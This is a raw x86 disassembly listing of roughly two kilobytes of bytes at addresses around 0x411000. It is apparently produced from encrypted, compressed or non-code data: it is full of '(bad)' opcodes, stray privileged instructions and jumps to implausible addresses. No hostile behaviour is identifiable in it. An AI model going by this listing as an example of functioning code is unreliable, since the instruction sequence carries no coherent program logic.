  4110da:	call   0x1aa1f44e
  4110df:	cli    
  4110e0:	inc    esi
  4110e1:	das    
  4110e2:	xor    bl,BYTE PTR [esi-0x4626d9b8]
  4110e8:	fmul   QWORD PTR [edi+0x76f47266]
  4110ee:	rcl    DWORD PTR [ebx],1
  4110f0:	test   BYTE PTR [edi+ebx*4],0x15
  4110f4:	hlt    
  4110f5:	imul   esi,DWORD PTR [ebx-0x4c5d6ddb],0xffffff90
  4110fc:	lea    edx,[edx-0x28]
  4110ff:	jo     0x4110b2
  411101:	mov    ds:0x5cc78d0a,al
  411106:	fwait
  411107:	ins    DWORD PTR es:[edi],dx
  411108:	hlt    
  411109:	mov    eax,0xc8cadefa
  41110e:	mov    eax,ds:0x81e3c8d1
  411113:	test   DWORD PTR [esi+0x59af6ffb],0x346e4ec1
  41111d:	jno    0x4110a1
  41111f:	dec    edi
  411120:	push   0xffffff9c
  411122:	ret    0x4dee
  411125:	push   ebp
  411126:	jne    0x4110a8
  411128:	cmc    
  411129:	jle    0x41112d
  41112b:	cmc    
  41112c:	and    dh,BYTE PTR [esi+0x5839c1a2]
  411132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411133:	mov    cl,0x10
  411135:	sar    ah,1
  411137:	push   ecx
  411138:	xor    BYTE PTR [eax+0x385b9d2e],0xf6
  41113f:	dec    ebx
  411140:	xor    al,0x96
  411142:	inc    ecx
  411143:	add    eax,0xfdd0e88b
  411148:	aam    0x80
  41114a:	cld    
  41114b:	and    ecx,DWORD PTR [eax+esi*2+0x7ba1169c]
  411152:	xor    al,dl
  411154:	fidiv  DWORD PTR [edx]
  411156:	addr16 cdq 
  411158:	sar    BYTE PTR [ebx],cl
  41115a:	cmp    al,0x3b
  41115c:	cmp    eax,0x6f595cdc
  411161:	inc    edi
  411162:	xchg   edx,eax
  411163:	inc    esp
  411164:	mov    ebp,0x27bfd09a
  411169:	or     ebp,DWORD PTR [ecx]
  41116b:	xor    DWORD PTR [esp+esi*8],edi
  41116e:	push   eax
  41116f:	xor    al,BYTE PTR [edx+0x1c]
  411172:	mov    BYTE PTR [eax],ch
  411174:	sbb    eax,0xdb810c10
  411179:	cmc    
  41117a:	jnp    0x41110c
  41117c:	jae    0x4111b8
  41117e:	fs cmp edx,esi
  411181:	ins    DWORD PTR es:[edi],dx
  411182:	popf   
  411183:	retf   
  411184:	xchg   ebx,eax
  411185:	or     BYTE PTR [edi+0x82b5e71],0x8
  41118c:	imul   edx,DWORD PTR [eax-0x16],0x1b
  411190:	es pop ebp
  411192:	mov    eax,0xa20c2fbd
  411197:	cdq    
  411198:	inc    ebp
  411199:	xchg   ebx,eax
  41119a:	xchg   esp,eax
  41119b:	popf   
  41119c:	adc    ch,BYTE PTR [edx-0x48]
  41119f:	push   ebx
  4111a0:	lahf   
  4111a1:	mov    bl,0xa
  4111a3:	or     al,0x77
  4111a5:	ret    
  4111a6:	inc    ecx
  4111a7:	pushf  
  4111a8:	pop    eax
  4111a9:	pusha  
  4111aa:	or     al,0x39
  4111ac:	loope  0x41121b
  4111ae:	or     DWORD PTR [esi-0x32],ebp
  4111b1:	xchg   edx,eax
  4111b2:	sbb    al,0x36
  4111b4:	sahf   
  4111b5:	adc    bh,bh
  4111b7:	sub    DWORD PTR fs:[ebp-0x4e],0x85d8f7b1
  4111bf:	xor    eax,0x9e2663bd
  4111c4:	mov    esi,0xefc27449
  4111c9:	ds and dl,bh
  4111cc:	sub    eax,0xf1d9ae61
  4111d1:	cmp    BYTE PTR [ebx+ebp*2],ah
  4111d4:	mov    al,0x74
  4111d6:	mov    al,ds:0x585c632c
  4111db:	adc    ah,BYTE PTR [ecx-0x33]
  4111de:	test   al,0x16
  4111e0:	or     BYTE PTR [esi+edx*1],ch
  4111e3:	lock test ah,0xa6
  4111e7:	test   BYTE PTR [eax+ebx*2],0x96
  4111eb:	jnp    0x41117b
  4111ed:	add    BYTE PTR [edx-0x70f7ed3e],ah
  4111f3:	rol    DWORD PTR [edx-0x7e],1
  4111f6:	jmp    0x4111da
  4111f8:	cmp    al,0x9e
  4111fa:	mov    edi,0xa283d740
  4111ff:	rcr    DWORD PTR [eax-0x2fbfc7d2],1
  411205:	mul    DWORD PTR [esi+0xe]
  411208:	cmp    eax,0x76dc59ad
  41120d:	sub    BYTE PTR [eax],al
  41120f:	cmp    DWORD PTR [ebx],esp
  411211:	cs cs push cs
  411214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411215:	and    ebp,DWORD PTR [edx-0x47ed4f3a]
  41121b:	mov    ecx,0xe25459f
  411220:	fidiv  DWORD PTR [edx+0x43]
  411223:	jge    0x41128e
  411225:	mov    al,0xdf
  411227:	fstp   st(1)
  411229:	and    al,0x8
  41122b:	and    edx,ebp
  41122d:	xor    DWORD PTR [ebx],eax
  41122f:	aam    0x8e
  411231:	jno    0x411204
  411233:	test   eax,0xe38c43e6
  411238:	mov    edi,0x9eff4c20
  41123d:	std    
  41123e:	test   BYTE PTR [ebp-0xc],bl
  411241:	cmovbe ebp,DWORD PTR [ebx+0x14579a73]
  411248:	mov    al,ds:0x91257f2
  41124d:	fld    DWORD PTR [edx]
  41124f:	das    
  411250:	out    0xf1,al
  411252:	pop    ebx
  411253:	arpl   si,dx
  411255:	(bad)  
  411257:	mov    ebp,0x33126cc4
  41125c:	mov    ebx,0x1cb42439
  411261:	retf   0x275f
  411264:	or     eax,0x47374640
  411269:	das    
  41126a:	out    0x34,eax
  41126c:	pop    esi
  41126d:	int    0xaa
  41126f:	mov    edx,0x25469a96
  411274:	popa   
  411275:	cli    
  411276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411277:	sub    eax,0xee5ac075
  41127c:	popa   
  41127d:	add    esp,ebp
  41127f:	int3   
  411280:	xor    al,0x68
  411282:	lock and al,0x66
  411285:	retf   
  411286:	push   ss
  411287:	sub    esp,DWORD PTR [edx+0x68]
  41128a:	push   edx
  41128b:	mov    dh,0x61
  41128d:	setp   BYTE PTR [ebx+0x10]
  411291:	mov    eax,ds:0x7c86f2c3
  411296:	les    esi,FWORD PTR [esi]
  411298:	pop    ss
  411299:	pop    esi
  41129a:	push   edx
  41129b:	in     eax,0xa
  41129d:	adc    ebp,ecx
  41129f:	sub    dl,BYTE PTR ds:0xd224afbb
  4112a5:	je     0x411257
  4112a7:	clc    
  4112a8:	ret    0xda9c
  4112ab:	adc    DWORD PTR [edx-0x178628cc],0x22
  4112b2:	mov    ebx,0x37213344
  4112b7:	xor    al,0xc2
  4112b9:	xor    esp,DWORD PTR [ecx+0x4a]
  4112bc:	into   
  4112bd:	sbb    eax,0xdf78bf73
  4112c2:	fistp  WORD PTR [ecx-0x657cff84]
  4112c8:	push   ebx
  4112c9:	add    DWORD PTR [ebp-0x47],edx
  4112cc:	fmul   DWORD PTR [ecx+0x6cb4a3fa]
  4112d2:	call   0x8ea46483
  4112d7:	repnz pop ebp
  4112d9:	jnp    0x4112f4
  4112db:	jg     0x411281
  4112dd:	int    0x50
  4112df:	mov    ds:0x21d3c1f5,eax
  4112e4:	call   0xa31b6a46
  4112e9:	pop    esp
  4112ea:	sub    dl,BYTE PTR [edi-0x27]
  4112ed:	add    eax,DWORD PTR [ebx]
  4112ef:	pop    ecx
  4112f0:	cmp    DWORD PTR [ecx+0x145cf2dc],esp
  4112f6:	jo     0x4112e5
  4112f8:	ja     0x411299
  4112fa:	shr    BYTE PTR [ebp+eiz*8-0x79047714],1
  411301:	inc    edx
  411302:	inc    esp
  411303:	sbb    BYTE PTR [esi-0x71],ah
  411306:	lock sub bh,dl
  411309:	repnz loop 0x4112f8
  41130c:	pop    esi
  41130d:	push   es
  41130e:	cs and eax,0xdf5749e1
  411314:	enter  0x853c,0x80
  411318:	retf   0x63e4
  41131b:	ds add al,0xa9
  41131e:	mov    bh,0x9
  411320:	xchg   ebx,eax
  411321:	ja     0x4112e2
  411323:	mov    al,ds:0x4b9d4d7e
  411328:	add    eax,0xaee35758
  41132d:	mov    cl,0x13
  41132f:	hlt    
  411330:	xor    edx,DWORD PTR [esi]
  411332:	inc    ebx
  411333:	sub    ebp,ecx
  411335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411336:	pusha  
  411337:	arpl   WORD PTR [ebx+eiz*1],ax
  41133a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41133b:	adc    eax,0x1371dff2
  411340:	cmp    eax,DWORD PTR [edx]
  411342:	push   ecx
  411343:	mov    ch,0x32
  411345:	rcr    DWORD PTR [esi],cl
  411347:	jne    0x411315
  411349:	mov    cl,0x72
  41134b:	add    al,0xf2
  41134d:	sbb    BYTE PTR [edx+0x246545eb],cl
  411353:	and    DWORD PTR [ebx+0x2bcc7cb2],0xad1971cc
  41135d:	mov    ecx,esp
  41135f:	mov    edx,0xbba1814
  411364:	add    al,0xd8
  411366:	pop    edx
  411367:	ds call 0xfd7d59eb
  41136d:	pop    edx
  41136e:	sbb    DWORD PTR [edx-0x68],esp
  411371:	(bad)
  411375:	jns    0x4113da
  411377:	icebp  
  411378:	or     al,0x12
  41137a:	daa    
  41137b:	stc    
  41137c:	aas    
  41137d:	fs (bad) 
  41137f:	je     0x411324
  411381:	pop    ebx
  411382:	les    ebp,FWORD PTR [esi-0x1f2c1bff]
  411388:	xchg   ecx,eax
  411389:	push   edx
  41138a:	loop   0x411328
  41138c:	enter  0x2d66,0x98
  411390:	adc    DWORD PTR [edi],ecx
  411392:	shr    BYTE PTR [eax-0x80],1
  411395:	adc    eax,DWORD PTR [ebx+0x24139e4f]
  41139b:	scas   eax,DWORD PTR es:[edi]
  41139c:	pop    esi
  41139d:	sub    eax,0x6e937b81
  4113a2:	lahf   
  4113a3:	lods   al,BYTE PTR ds:[esi]
  4113a4:	jle    0x411406
  4113a6:	sub    cl,BYTE PTR [esi+0x4e]
  4113a9:	popf   
  4113aa:	inc    eax
  4113ab:	xchg   BYTE PTR [ebp+eiz*2+0x71],al
  4113af:	mov    ebp,DWORD PTR [eax]
  4113b1:	jns    0x411383
  4113b3:	sahf   
  4113b4:	sbb    DWORD PTR [eax+0x35393154],edi
  4113ba:	sahf   
  4113bb:	lea    ebx,[ebp+eiz*8+0x3fff81a3]
  4113c2:	or     DWORD PTR [edx+0x4088fd23],0x9c9be09e
  4113cc:	sub    ecx,DWORD PTR [esi-0x55]
  4113cf:	jb     0x4113bc
  4113d1:	cdq    
  4113d2:	pop    ebx
  4113d3:	ret    
  4113d4:	test   BYTE PTR [eax],al
  4113d6:	(bad)  
  4113d7:	out    0x88,al
  4113d9:	leave  
  4113da:	pop    edx
  4113db:	test   cl,0x7b
  4113de:	xchg   al,ah
  4113e0:	mov    DWORD PTR [ebp-0x7202e89c],edx
  4113e6:	out    dx,eax
  4113e7:	lahf   
  4113e8:	imul   edi,DWORD PTR [edi+0x16],0xb
  4113ec:	push   ds
  4113ed:	popf   
  4113ee:	das    
  4113ef:	or     al,0xa4
  4113f1:	lods   eax,DWORD PTR ds:[esi]
  4113f2:	jmp    0x6dbbdee1
  4113f7:	fist   DWORD PTR [edx+0x1f]
  4113fa:	jge    0x4113cf
  4113fc:	in     eax,dx
  4113fd:	inc    edi
  4113fe:	inc    ebp
  4113ff:	add    BYTE PTR ds:0x59de6f7d,0x33
  411406:	add    DWORD PTR [ecx],0xffffffe9
  411409:	cmp    al,0x23
  41140b:	add    DWORD PTR [ebx],ebp
  41140d:	nop
  41140e:	xchg   esp,eax
  41140f:	push   edx
  411410:	push   ecx
  411411:	push   cs
  411412:	xchg   ebx,eax
  411413:	push   esp
  411414:	mov    edi,0x6b25b1ba
  411419:	mov    al,ds:0x27b0da09
  41141e:	sub    esp,ebp
  411420:	push   ecx
  411421:	(bad)  
  411422:	out    0x4e,eax
  411424:	(bad)  
  411426:	adc    al,0x78
  411428:	add    eax,0x4127c156
  41142d:	es das 
  41142f:	push   0x5115bb1b
  411434:	dec    ebp
  411435:	add    ebx,DWORD PTR [eax+0x2b3c5195]
  41143b:	out    0x9d,al
  41143d:	rcl    DWORD PTR [ebx+0x765cbfb4],0xe7
  411444:	push   eax
  411445:	out    dx,eax
  411446:	shl    eax,0x93
  411449:	pop    edx
  41144a:	jg     0x411468
  41144c:	pop    edx
  41144d:	inc    ebp
  41144e:	mov    ebx,0x5d720dfc
  411453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411455:	cmp    bl,BYTE PTR ds:0x73fa4c60
  41145b:	mov    al,ds:0xec43f2ed
  411460:	push   es
  411461:	push   es
  411462:	cmc    
  411463:	enter  0xb7a7,0xc8
  411467:	xchg   BYTE PTR [esi+esi*1],cl
  41146a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146b:	lods   al,BYTE PTR ds:[esi]
  41146c:	or     BYTE PTR [ebx+ebp*4],ah
  41146f:	inc    edi
  411470:	cs (bad) 
  411472:	arpl   si,si
  411474:	aaa    
  411475:	sti    
  411476:	ins    BYTE PTR es:[edi],dx
  411477:	inc    edx
  411478:	push   ds
  411479:	xor    al,cl
  41147b:	adc    eax,0xca0ac431
  411480:	ins    BYTE PTR es:[edi],dx
  411481:	xchg   edi,eax
  411482:	mov    cl,0xc8
  411484:	repnz retf 0x7250
  411488:	xchg   edi,eax
  411489:	es fs jo 0x411493
  41148d:	jp     0x41146d
  41148f:	sbb    DWORD PTR [edi-0x702659b5],eax
  411495:	daa    
  411496:	dec    edi
  411497:	dec    esi
  411498:	and    DWORD PTR [ecx],eax
  41149a:	inc    esi
  41149b:	or     eax,0x4142b4e4
  4114a0:	(bad)  
  4114a1:	adc    eax,0xebcfc379
  4114a6:	pop    edi
  4114a7:	lds    ebx,FWORD PTR [edi-0x2e]
  4114aa:	and    esp,DWORD PTR [edx]
  4114ac:	dec    ebp
  4114ad:	sbb    al,dl
  4114af:	ret    0x11b2
  4114b2:	jle    0x41144c
  4114b4:	call   0xde1d7beb
  4114b9:	in     al,0x22
  4114bb:	nop
  4114bc:	test   DWORD PTR [ebx],ebx
  4114be:	pop    ecx
  4114bf:	into   
  4114c0:	rcr    dh,cl
  4114c2:	jnp    0x411531
  4114c4:	push   edi
  4114c5:	jbe    0x41151b
  4114c7:	fwait
  4114c8:	test   BYTE PTR [edx-0x56b047c8],bl
  4114ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114cf:	in     al,dx
  4114d0:	xor    ecx,DWORD PTR [edx]
  4114d2:	out    0x87,eax
  4114d4:	pop    ebx
  4114d5:	dec    ebp
  4114d6:	xchg   edi,eax
  4114d7:	pop    edi
  4114d8:	cmp    al,BYTE PTR [ebp+0x7c]
  4114db:	cwde   
  4114dc:	pop    ebp
  4114dd:	inc    esp
  4114de:	xchg   edi,eax
  4114df:	ret    0x6691
  4114e2:	shl    dh,0x20
  4114e5:	clc    
  4114e6:	aaa    
  4114e7:	mov    eax,ds:0xd164f63
  4114ec:	jo     0x41146f
  4114ee:	clc    
  4114ef:	js     0x41152d
  4114f1:	adc    eax,DWORD PTR [esi]
  4114f3:	sub    ecx,edi
  4114f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114f6:	loop   0x41152a
  4114f8:	in     eax,0x5f
  4114fa:	lods   eax,DWORD PTR ds:[esi]
  4114fb:	popf   
  4114fc:	xchg   ebx,eax
  4114fd:	and    eax,DWORD PTR [edx+0x5e15777d]
  411503:	and    esi,ebx
  411505:	and    eax,0x10eae3e4
  41150a:	adc    al,0x3d
  41150c:	push   ss
  41150d:	mov    edx,0xfe4d218f
  411512:	mov    ds,WORD PTR [ebx+esi*8+0x26fe421c]
  411519:	sbb    ch,ah
  41151b:	out    dx,al
  41151c:	test   eax,0xc40c818b
  411521:	in     al,dx
  411522:	or     BYTE PTR [edx+0x52],bh
  411525:	sar    BYTE PTR ds:0xd0b51e7f,0xc9
  41152c:	jo     0x4114c3
  41152e:	mov    WORD PTR [edx+esi*1-0x33e6a682],ds
  411535:	icebp  
  411536:	data16 lods al,BYTE PTR ds:[esi]
  411538:	add    DWORD PTR [esi+0x173d8a9a],edx
  41153e:	jecxz  0x411580
  411540:	jmp    0xe7e4:0x1f0de03b
  411547:	aam    0x8f
  411549:	popa   
  41154a:	add    BYTE PTR [eax],dl
  41154c:	adc    BYTE PTR [eax],0x73
  41154f:	mov    edx,DWORD PTR [ebx+0x73]
  411552:	out    dx,eax
  411553:	inc    edi
  411554:	call   0x89ec:0xc35fd4af
  41155b:	pop    eax
  41155c:	xchg   BYTE PTR [edx+0x7d8579d8],dl
  411562:	push   eax
  411563:	sbb    ch,BYTE PTR [eax]
  411565:	jecxz  0x4115ae
  411567:	or     eax,0x2eb9ba81
  41156c:	ja     0x411529
  41156e:	pusha  
  41156f:	dec    ebp
  411570:	xchg   esi,eax
  411571:	pop    ebp
  411572:	sbb    al,0x29
  411574:	sub    BYTE PTR [ecx-0x3b12a330],0x63
  41157b:	ret    
  41157c:	repz add bh,ah
  41157f:	jmp    0x41151a
  411581:	mov    ds:0xa437a337,al
  411586:	mov    ebx,0x3d83b452
  41158b:	mov    ch,0x9b
  41158d:	inc    esi
  41158e:	imul   eax,esp,0xf30ca029
  411594:	xlat   BYTE PTR ds:[ebx]
  411595:	add    ch,BYTE PTR [eax+0x79223bd5]
  41159b:	pop    eax
  41159c:	jmp    0xac1b:0xd6fd5b3
  4115a3:	xchg   ecx,eax
  4115a4:	ins    DWORD PTR es:[edi],dx
  4115a5:	dec    edx
  4115a6:	push   esi
  4115a7:	cdq    
  4115a8:	ret    
  4115a9:	pushf  
  4115aa:	lea    edx,[ecx-0x75b8b7be]
  4115b0:	push   es
  4115b1:	jae    0x41155f
  4115b3:	and    bh,dh
  4115b5:	int3   
  4115b6:	nop
  4115b7:	fmul   st(6),st
  4115b9:	test   BYTE PTR [ebx+0x5b9a3ade],0x5f
  4115c0:	retf   0x7aa9
  4115c3:	xchg   edx,eax
  4115c4:	pmaxub mm7,mm1
  4115c7:	popw   ss
  4115c9:	adc    eax,0x68f03aca
  4115ce:	(bad)  
  4115cf:	jb     0x411595
  4115d1:	sbb    ch,BYTE PTR [ebp+esi*1-0x558e542c]
  4115d8:	arpl   di,ax
  4115da:	(bad)  
  4115db:	fstp   DWORD PTR gs:[ecx]
  4115de:	les    eax,FWORD PTR [eax-0x7]
  4115e1:	pop    ss
  4115e2:	mov    cl,0x4f
  4115e4:	ss jns 0x4115a3
  4115e7:	lock pushf 
  4115e9:	or     ebx,ebp
  4115eb:	xchg   edx,eax
  4115ec:	ss jo  0x41160c
  4115ef:	lock xchg edx,eax
  4115f1:	pop    esi
  4115f2:	push   esp
  4115f3:	mov    cl,0x9e
  4115f5:	stos   BYTE PTR es:[edi],al
  4115f6:	mov    eax,ds:0xa67809b0
  4115fb:	xchg   ebx,eax
  4115fc:	push   edi
  4115fd:	out    0x14,al
  4115ff:	sbb    al,0x45
  411601:	test   BYTE PTR [bx+0x6154],ch
  411606:	popf   
  411607:	dec    eax
  411608:	xchg   esp,eax
  411609:	and    eax,0x6f625f42
  41160e:	rcl    DWORD PTR [ecx],1
  411610:	pop    ds
  411611:	(bad)  
  411612:	jne    0x41168c
  411614:	push   ds
  411615:	push   ebx
  411616:	cwde   
  411617:	cli    
  411618:	adc    al,0x6e
  41161a:	mov    ebx,0xbcc376c8
  41161f:	and    ebp,esp
  411621:	xchg   ebp,eax
  411622:	dec    ebp
  411623:	dec    ecx
  411624:	rcl    BYTE PTR [esi+0x1ae022cc],cl
  41162a:	call   0xdd97e2c8
  41162f:	cmp    al,bl
  411631:	jecxz  0x4116a9
  411633:	test   dl,cl
  411635:	cmp    al,BYTE PTR [ebp+0x4a]
  411638:	(bad)  
  411639:	fistp  QWORD PTR [ebp+0x5df6e482]
  41163f:	jb     0x4116bc
  411641:	pop    esp
  411642:	cmp    al,0xdd
  411644:	sub    al,0x6a
  411646:	xchg   ebx,eax
  411647:	push   es
  411648:	das    
  411649:	fld    QWORD PTR [edx+0x54]
  41164c:	or     al,0xbb
  41164e:	xor    eax,0xbb1ee016
  411653:	aaa    
  411654:	xchg   edx,eax
  411655:	xchg   ebx,eax
  411656:	lods   eax,DWORD PTR ds:[esi]
  411657:	push   cs
  411658:	imul   esi,DWORD PTR [eax+ebp*8+0x68],0xffffff8b
  41165d:	jno    0x4116de
  41165f:	mov    al,0xc3
  411661:	push   0x2b161556
  411666:	fadd   QWORD PTR [edi+0x14]
  411669:	bound  ebp,QWORD PTR [edi+0x49]
  41166c:	push   ecx
  41166d:	sbb    bh,BYTE PTR [ebp-0x66]
  411670:	icebp  
  411671:	cld    
  411672:	pop    esp
  411673:	adc    BYTE PTR [ebx-0x15cf6493],cl
  411679:	xchg   esi,eax
  41167a:	lods   eax,DWORD PTR ds:[esi]
  41167b:	xor    eax,0xbe146931
  411680:	inc    edi
  411681:	jl     0x411609
  411683:	pop    ss
  411684:	adc    DWORD PTR [eax+ecx*8],esi
  411687:	rol    dl,1
  411689:	cdq    
  41168a:	inc    edx
  41168b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41168c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41168d:	aam    0x87
  41168f:	xor    BYTE PTR [eax+esi*1-0x862e346],0xfe
  411697:	sub    DWORD PTR [edx],esp
  411699:	test   DWORD PTR [eax-0x598312d0],eax
  41169f:	pop    ebx
  4116a0:	pop    ebx
  4116a1:	sbb    al,0xdd
  4116a3:	out    0x4b,al
  4116a5:	or     al,0x9d
  4116a7:	inc    eax
  4116a8:	and    esp,DWORD PTR [ecx-0x18]
  4116ab:	push   0x75dfbda9
  4116b0:	mov    WORD PTR [ecx-0x7b],fs
  4116b3:	add    esi,eax
  4116b5:	ss rcr al,0x62
  4116b9:	mov    ecx,0x5de48843
  4116be:	xchg   edx,eax
  4116bf:	mov    dl,0x4a
  4116c1:	mov    DWORD PTR [ebp-0x721d2b0],ebx
  4116c7:	sbb    BYTE PTR [ebx],ah
  4116c9:	and    esi,edx
  4116cb:	jl     0x411706
  4116cd:	test   ebx,ecx
  4116cf:	sub    dh,BYTE PTR [esi-0x20]
  4116d2:	enter  0xacc9,0x7
  4116d6:	(bad)  
  4116d7:	scas   al,BYTE PTR es:[edi]
  4116d8:	xor    eax,0x4e2a24d8
  4116dd:	and    ecx,DWORD PTR [ebx-0x41]
  4116e0:	inc    edi
  4116e1:	call   0x5866968
  4116e6:	sbb    eax,DWORD PTR [edx+0x1fb844ea]
  4116ec:	fcmovbe st,st(0)
  4116ee:	xchg   ecx,eax
  4116ef:	mov    ds:0x8e8ef3c8,al
  4116f4:	mov    edi,0xe0423b20
  4116f9:	in     eax,dx
  4116fa:	jae    0x4116c1
  4116fc:	repz cld 
  4116fe:	fdiv   DWORD PTR [ecx-0x5]
  411701:	(bad)  
  411702:	xchg   esp,eax
  411703:	pop    eax
  411704:	pop    ebx
  411705:	retf   
  411706:	mov    DWORD PTR [ecx-0x47c5f6be],0xced7c93c
  411710:	cmp    eax,0x29bc9b19
  411715:	add    al,0x1a
  411717:	and    DWORD PTR [edx+0x1a],ebx
  41171a:	xchg   ebp,eax
  41171b:	jne    0x41175c
  41171d:	add    al,0xff
  41171f:	cmp    eax,DWORD PTR [esi-0x41]
  411722:	ins    DWORD PTR es:[edi],dx
  411723:	je     0x411761
  411725:	jno    0x4116b1
  411727:	pop    eax
  411728:	pop    ebp
  411729:	shr    BYTE PTR es:[esp+edx*4],cl
  41172d:	ja     0x41172e
  41172f:	fstp   st(6)
  411731:	ins    BYTE PTR es:[edi],dx
  411732:	cli    
  411733:	sub    ch,ch
  411735:	and    esp,DWORD PTR [edi+0x2efc0553]
  41173b:	pop    edi
  41173c:	sub    ch,BYTE PTR [esp+ebx*1+0x5b2f3ddd]
  411743:	in     eax,0xf3
  411745:	xor    bl,BYTE PTR [ecx]
  411747:	or     BYTE PTR [ebp-0xd8e2608],ch
  41174d:	daa    
  41174e:	iret   
  41174f:	ja     0x41178f
  411751:	sar    DWORD PTR [esi-0x31],1
  411754:	retf   
  411755:	inc    ebx
  411756:	in     eax,dx
  411757:	ins    DWORD PTR es:[edi],dx
  411758:	imul   ebp,DWORD PTR [ebp-0x37118b75],0x7c61826a
  411762:	in     eax,0xb0
  411764:	scas   eax,DWORD PTR es:[edi]
  411765:	push   es
  411766:	xor    ch,ch
  411768:	(bad)  
  41176a:	mov    WORD PTR [eax],fs
  41176c:	xor    dl,BYTE PTR [ebx+eiz*4]
  41176f:	and    dh,BYTE PTR [ecx]
  411771:	ins    BYTE PTR es:[edi],dx
  411772:	stc    
  411773:	mov    bl,0x13
  411775:	retf   
  411776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411777:	dec    ebp
  411778:	mov    ah,0xe
  41177a:	mov    WORD PTR [edx-0x36193f1d],?
  411780:	cmp    eax,0xba3545d
  411785:	or     ch,BYTE PTR [ecx-0x2d8abcd4]
  41178b:	mov    ecx,0xcdc7e67a
  411790:	fidiv  WORD PTR [edx]
  411792:	sbb    al,0x48
  411794:	popf   
  411795:	sbb    al,0x8f
  411797:	addr16 jnp 0x411795
  41179a:	sbb    dh,bh
  41179c:	popf   
  41179d:	push   0x42
  41179f:	adc    BYTE PTR [ebp-0x36356633],dl
  4117a5:	cmp    DWORD PTR [ebp+0xf],edi
  4117a8:	fisub  DWORD PTR [ecx-0x75]
  4117ab:	push   0x72
  4117ad:	sti    
  4117ae:	mov    dl,bh
  4117b0:	ins    DWORD PTR es:[edi],dx
  4117b1:	shl    BYTE PTR [esi+0x56],1
  4117b4:	xor    dh,BYTE PTR [ecx+0x4b]
  4117b7:	mov    dh,0xe9
  4117b9:	sbb    BYTE PTR [ebp+0x11],ah
  4117bc:	js     0x411746
  4117be:	sti    
  4117bf:	inc    edx
  4117c0:	pop    ebx
  4117c1:	jp     0x4117f1
  4117c3:	out    0xfd,al
  4117c5:	scas   eax,DWORD PTR es:[edi]
  4117c6:	mov    cl,0xd2
  4117c8:	jns    0x4117c2
  4117ca:	pop    ss
  4117cb:	xchg   DWORD PTR [edx+eax*2],eax
  4117ce:	outs   dx,BYTE PTR ds:[esi]
  4117cf:	dec    esi
  4117d0:	cmp    BYTE PTR [ecx+ebp*8-0x12],cl
  4117d4:	push   edx
  4117d5:	cmp    ebp,DWORD PTR [esi-0x67cb5bc7]
  4117db:	test   eax,0x5c6a1f58
  4117e0:	test   BYTE PTR [ecx+0x3a],bl
  4117e3:	rsqrtps xmm3,XMMWORD PTR [esi+esi*8+0x7b59424f]
  4117eb:	xor    eax,0x23984c76
  4117f0:	and    eax,DWORD PTR [ebx]
  4117f2:	in     al,dx
  4117f3:	sbb    DWORD PTR [ecx-0x68],esp
  4117f6:	xlat   BYTE PTR ds:[ebx]
  4117f7:	and    bl,dl
  4117f9:	mov    edi,DWORD PTR fs:[edi]
  4117fc:	add    dl,BYTE PTR [esi+0x1e68bb26]
  411802:	cli    
  411803:	pop    eax
  411804:	sbb    DWORD PTR [ecx+0x1d0f91d],esi
  41180a:	and    BYTE PTR [ebp+0x6e],dh
  41180d:	add    al,0xd6
  41180f:	repnz pop edi
  411811:	or     al,0xbb
  411813:	and    esp,DWORD PTR [eax+0x37]
  411816:	xchg   edi,eax
  411817:	ja     0x4117b5
  411819:	mov    eax,ds:0xa90699b5
  41181e:	lea    edi,[edx+eiz*1]
  411821:	pop    esp
  411822:	mov    DWORD PTR [edx+0x1201b01b],ecx
  411828:	xor    eax,0x16758bcf
  41182d:	pop    ss
  41182e:	adc    BYTE PTR [edx-0x36619b3b],dl
  411834:	outs   dx,DWORD PTR ds:[esi]
  411835:	or     eax,DWORD PTR [edi]
  411837:	popf   
  411838:	call   0xfec7:0xcb3f32cd
  41183f:	jnp    0x411809
  411841:	push   ds
  411842:	lods   al,BYTE PTR ds:[esi]
  411843:	pop    ecx
  411844:	mov    edx,0xdb33cb74
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0x9baba54
  411868:	sub    DWORD PTR [ebx+0x62626af4],eax
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx-0x65]
  411873:	xor    ah,BYTE PTR [esi+0x11]
  411876:	ins    DWORD PTR es:[edi],dx
  411877:	test   dl,cl
  411879:	mov    ebx,0x4be7e843
  41187e:	div    DWORD PTR [ebx+ebp*2-0x57007e5]
  411885:	out    dx,eax
  411886:	or     ebx,DWORD PTR [esi]
  411888:	mul    eax
  41188a:	add    BYTE PTR [ecx+0x591bd87c],0xfa
  411891:	adc    DWORD PTR [ebp+0x436a2f6c],edi
  411897:	sub    al,0x7b
  411899:	out    dx,eax
  41189a:	mov    BYTE PTR [ebx-0xedb35ba],dl
  4118a0:	loopne 0x4118f4
  4118a2:	jbe    0x411902
  4118a4:	xchg   ebx,eax
  4118a5:	shl    BYTE PTR [eax],cl
  4118a7:	dec    esi
  4118a8:	pop    ds
  4118a9:	popf   
  4118aa:	(bad)  
  4118ab:	daa    
  4118ac:	outs   dx,DWORD PTR ds:[esi]
  4118ad:	cmp    dh,BYTE PTR [esi+0x76]
  4118b0:	adc    DWORD PTR [edx+0x63a61306],esi
  4118b6:	mov    WORD PTR [ecx-0x75135aa],?
  4118bc:	adc    BYTE PTR [edx],ch
  4118be:	push   ss
  4118bf:	lock imul edi,DWORD PTR [edx-0x434aeaab],0xc96c3d64
  4118ca:	sbb    eax,0xe3ac3206
